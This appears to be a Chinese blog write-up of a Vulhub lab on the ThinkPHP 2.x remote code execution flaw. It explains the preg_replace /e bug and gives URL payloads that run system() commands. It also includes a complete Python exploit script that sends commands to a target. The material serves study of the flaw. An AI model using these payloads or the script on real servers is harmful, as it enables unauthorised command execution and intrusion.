---
title: Vulhub-ThinkPHP_2.x_RCE
published: 2026-07-13T22:00:00
description: 基于ThinkPHP 2.x框架远程代码执行漏洞的Python利用脚本，通过构造包含恶意payload的URL实现任意系统命令执行，帮助理解PHP反序列化与正则表达式/e修饰符的安全风险。
tags:
  - 靶场
  - Python
category: 网络安全
draft: false
---

# 关键代码

这行代码负责解析 URL，提取控制器名和方法名

```php
$res = preg_replace(
    '@(\w+)' . $depr . '([^' . $depr . '\/]+)@e',
    '$var[\'\\1\']="\\2";',
    implode($depr, $paths)
);
```

**解析**：

- `@` 是定界符（和 `/` 一样，只是换了个符号）
    
- `(\w+)` → 捕获一组**单词字符**（字母、数字、下划线）
    
- `/` → 字面量的斜杠（来自 `$depr`）
    
- `([^/\/]+)` → 捕获**除了斜杠 `/` 以外的任意字符**，至少一个（`\/` 就是转义后的 `/`，所以字符类 `[^/\/]` 等价于 `[^/]`）
    
- `@e` → 末尾的 `e` 是**执行开关**，告诉 PHP：把替换结果当代码跑

- 当 `preg_replace` 的**替换字符串**（第三个参数）以 `/e` 结尾时，**替换结果会被当作 PHP 代码执行**（相当于 `eval()`）。
    
- 执行前，替换字符串中的反向引用（`\1`、`\2`）会被匹配到的内容替换，然后整个字符串作为代码运行。

- 正则匹配：`(\w+)` 匹配单词，接着是 `$depr`（分隔符），然后是 `([^' . $depr . '\/]+)`（匹配不包含分隔符和 `/` 的连续字符）。
    
- 替换字符串：`'$var[\'\\1\']="\\2";'`，在 `/e` 作用下，最终会变成以下语句，并**立即执行**这条赋值语句。

```php
    $var['匹配到的第一个分组'] = "匹配到的第二个分组";
```

# 漏洞核心知识点

|           知识点            |         解释         |                为什么危险？                 |
| :----------------------: | :----------------: | :-----------------------------------: |
|   **`preg_replace()`**   |    PHP 的正则替换函数     |           功能：将匹配的内容替换成指定字符串           |
|       **`/e` 修饰符**       | 让替换字符串被当作 PHP 代码执行 | **这是漏洞根源！** 攻击者可以控制 URL 路径，从而控制被执行的代码 |
| **`$var['\\1']="\\2";`** |  正则替换后生成的 PHP 代码   |    `\\1` 和 `\\2` 是正则捕获组，来自 URL 路径     |

# 关键理解

当 URL 是：

```
/index.php?s=/index/index/任意名/任意值
```

程序会从路径中提取：

- `\\1` = `name`（键），可以是任意名

- `\\2` = `任意值`（值），会被当做代码执行的点

然后执行：

```php
$var['name'] = "任意值";
```

因为 `/e` 的存在，**`"任意值"` 这段字符串会被当作 PHP 代码执行**

## payload

尝试访问：

```
http://47.103.27.133:8080/index.php?s=/index/index/name/${phpinfo()}
```

发现页面回显了php的信息

# 理解payload的演变

## 第一步尝试

**直接写 `phpinfo()`**

URL中的payload：`/index/index/name/${phpinfo()}`

最终执行的代码是：`$var['name'] = "${phpinfo()}";`

## 第二步尝试

**使用 `system()` 执行系统命令**

URL中的payload：`/index/index/name/${system(whoami)}`

最终执行的代码是：`$var['name'] = "${system(whoami)}";`

## 第三步尝试

**用 `$_GET` 传递参数**

URL中的payload：`/index.php?s=/index/index/name/${system($_GET[c])}&c=whoami`

最终执行的代码是：`$var['name'] = "${system($_GET[c])}"`

# Python脚本


```python
import requests
import sys
```

**知识点**：

- `requests`：发送 HTTP 请求
    
- `sys`：获取命令行参数

## 获取用户输入

```python
# 从命令行获取目标 URL
if len(sys.argv) < 2:
    print("请提供目标 URL")
    sys.exit(1)

target_url = sys.argv[1]
```

**知识点**：

- `sys.argv` 是列表，`sys.argv[0]` 是脚本名，`sys.argv[1]` 是第一个参数
    
- `sys.exit(1)` 以状态码 1 退出（表示有错误）

## 构造URL

```python
# 基础payload（使用$_GET[c] 传递命令）
payload = "/index.php?s=/index/index/name/${system($_GET[c])}"
if target_url.endswith('/'):
    target_url = target_url[:-1]
# 构造完整的URL
exploit_url = target_url + payload
print(f"[*] 尝试访问: {exploit_url}")
```

**知识点**：

- `target_url.endswith('/')`：检查 `target_url` 字符串是否以 `/` 结尾。
    
- `target_url[:-1]`：Python 切片语法，表示取字符串从开头到倒数第二个字符（即去掉最后一个字符）。

## 添加命令参数

```python
# 添加命令参数
command = "whoami"  # 可以更改为其他命令
params = {
    'c': command
    }
```

**知识点：**

- `params` 是一个 Python 字典，键为 `'c'`，值为 `command`（如 `"whoami"`）。
    
- 在 `requests.get(exploit_url, params=params)` 中，`params` 参数会让 `requests` 自动将字典转换为 URL 的查询字符串（即 `?` 后面的部分），并对值进行 URL 编码。
    

例如，`exploit_url = "http://.../index.php?s=...&"`，`params={'c':'whoami'}` 会被拼接成 `...&c=whoami`。

> **好处**：你无需手动拼接 `&c=whoami`，`requests` 会自动处理编码，避免特殊字符出错。

## 发送请求

```python
try:
    response = requests.get(exploit_url, params=params, timeout=10)  # 建议添加 timeout
    print(f"[*] 实际请求的完整URL: {response.url}")  # 这行代码会输出最终拼接好的URL
    print("[*] 响应状态码: {}".format(response.status_code))
    # print("[*] 响应内容:\n{}".format(response.text))
except requests.exceptions.ConnectionError:
    print("[!] 无法连接到目标，请检查URL是否正确或目标是否运行。")
    sys.exit(1)
except requests.exceptions.Timeout:
    print("[!] 请求超时，目标可能响应缓慢或无法访问。")
    sys.exit(1)
except Exception as e:
    print(f"[!] 发生未知错误: {e}")
    sys.exit(1)
```

**知识点**：

**`requests` 库的聪明之处**：  

当你使用 `params` 参数时，`requests` 会自动检查 URL 中是否已有 `?`。

如果 **没有** `?`（例如 `http://example.com/index.php`），则用 `?` 连接，变成 `...?c=whoami`。

如果 **已有** `?`（例如你的 `...?s=...`），则用 `&` 连接，变成 `...?s=...&c=whoami`

- `requests.get(url, params=params)` 会自动将参数字典拼接成 `&c=whoami`
    
- `response.status_code` 获取 HTTP 状态码
    
- `response.text` 获取响应内容（文本格式）

## 分析响应

```python
if "root" in response.text or "www-data" in response.text or "apache" in response.text:
    print("[+] 可能存在远程代码执行漏洞！")
else:
    print("[-] 未检测到明显的远程代码执行迹象。或者重新检查payload")
```